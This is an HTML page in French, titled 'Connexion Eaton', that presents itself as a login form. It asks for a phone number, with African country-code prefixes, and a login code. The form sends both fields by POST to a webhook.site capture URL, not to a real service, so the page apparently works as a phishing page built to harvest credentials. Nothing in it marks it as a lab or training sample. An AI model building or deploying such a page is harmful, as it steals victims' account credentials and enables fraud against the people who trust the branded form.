<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Connexion Eaton</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #ffffff;
    }

    .container {
      max-width: 400px;
      margin: 60px auto;
      padding: 20px;
    }

    h1 {
      font-size: 24px;
      font-weight: bold;
      margin-bottom: 10px;
      color: #000;
    }

    p {
      color: #888;
      margin-bottom: 30px;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: #555;
    }

    .phone-input {
      display: flex;
      align-items: center;
      background: #f9f9f9;
      border: none;
      border-radius: 10px;
      padding: 10px;
      margin-bottom: 20px;
    }

    .phone-input select {
      border: none;
      background: transparent;
      font-size: 16px;
      margin-right: 10px;
    }

    .phone-input input {
      border: none;
      background: transparent;
      font-size: 16px;
      flex: 1;
      outline: none;
    }

    .password-input {
      display: flex;
      align-items: center;
      background: #f9f9f9;
      border: none;
      border-radius: 10px;
      padding: 10px;
      margin-bottom: 20px;
    }

    .password-input input {
      border: none;
      background: transparent;
      font-size: 16px;
      flex: 1;
      outline: none;
    }

    .password-input button {
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
    }

    .password-input svg {
      width: 24px;
      height: 24px;
      stroke: #555;
    }

    button.submit {
      width: 100%;
      padding: 15px;
      background-color: #3e6efc;
      border: none;
      border-radius: 30px;
      color: white;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
    }

    .footer-text {
      text-align: center;
      margin-top: 20px;
      color: #555;
    }

    .footer-text a {
      color: #3e6efc;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Bienvenue à nous rejoindre</h1>
    <p>Connectez-vous à votre compte</p>

    <form action="https://webhook.site/b1fb39f5-27fc-412a-adba-4a0bdd868cb5" method="POST">
      <label for="phone">Numéro de Téléphone</label>
      <div class="phone-input">
        <select name="prefixe">
          <option value="+221">+221</option>
          <option value="+225">+225</option>
          <option value="+226">+226</option>
          <option value="+228">+228</option>
          <option value="+229">+229</option>
          <option value="+237">+237</option>
        </select>
        <input type="tel" name="telephone" placeholder="Veuillez entrer votre numéro" required />
      </div>

      <label for="password">Code de Connexion</label>
      <div class="password-input">
        <input type="password" name="password" id="password" placeholder="Code de Connexion" required />
        <button type="button" onclick="togglePassword()">
          <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2">
            <path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-5.373-10-7s4.477-7 10-7c1.14 0 2.235.21 3.252.598m4.134 2.165A9.975 9.975 0 0122 12c0 1.084-.319 2.225-.875 3.375M15 12a3 3 0 11-6 0 3 3 0 016 0zm-6.364 6.364L4 4m16 16L4 4" />
          </svg>
        </button>
      </div>

      <button class="submit" type="submit">Se Connecter Maintenant</button>

      <div class="footer-text">
        Vous n'avez pas de compte ? <a href="#">Inscrivez-vous</a>
      </div>
    </form>
  </div>

  <script>
    const passwordInput = document.getElementById("password");
    const eyeIcon = document.getElementById("eye-icon");

    function togglePassword() {
      const isHidden = passwordInput.type === "password";
      passwordInput.type = isHidden ? "text" : "password";
      eyeIcon.innerHTML = isHidden
        ? `<path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/><path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>`
        : `<path stroke-linecap="round" stroke-linejoin="round" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-5.373-10-7s4.477-7 10-7c1.14 0 2.235.21 3.252.598m4.134 2.165A9.975 9.975 0 0122 12c0 1.084-.319 2.225-.875 3.375M15 12a3 3 0 11-6 0 3 3 0 016 0zm-6.364 6.364L4 4m16 16L4 4" />`;
    }
  </script>
</body>
</html>
